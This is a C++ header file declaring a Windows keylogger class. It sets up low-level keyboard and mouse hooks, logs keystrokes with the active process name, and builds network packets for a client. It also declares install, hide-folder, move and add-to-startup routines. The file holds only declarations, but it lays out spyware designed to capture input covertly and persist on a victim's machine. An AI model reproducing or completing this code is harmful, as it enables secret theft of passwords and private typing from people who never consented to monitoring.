#pragma once

#ifndef KEYLOGGER_H_
#define KEYLOGGER_H_

#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <ctime>
#include <time.h>
#include <stdio.h>
#include <io.h>
#include <fstream>
#include <direct.h>
#include <atlstr.h>
#include <Psapi.h>
#include "keyboard.h"
#include "Protocol.hpp"

#define INSTALL_TEXT "KL-ec: INSTALL OK"
#define INSTALL_DOSSIER "C:"

bool				checkCurrentProcess(TCHAR *buffer, DWORD cchLen);
std::string			getActiveProcess();
void				writeToLogsFile(std::string str);
void				prepareStr();
void				fillStructValue(struct Packet *str, const char *activeProcess);

class				KeyLogger
{
public:
					KeyLogger(int argc, char **argv);
					~KeyLogger();

	static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK mouseProc(int nCode, WPARAM wParam, LPARAM lParam);
	int				readClientInput();
	void			install();
	void			movekl(std::string from, std::string to);
	void			hidekl(std::string folder);
	void			addToStartupApplication();

private:
	HHOOK			hKeyboardHook;
	HHOOK			hMouseHook;
	std::string		_dir;
	FILE			*_logsFile;
};

#endif /* !KEYLOGGER_H_ */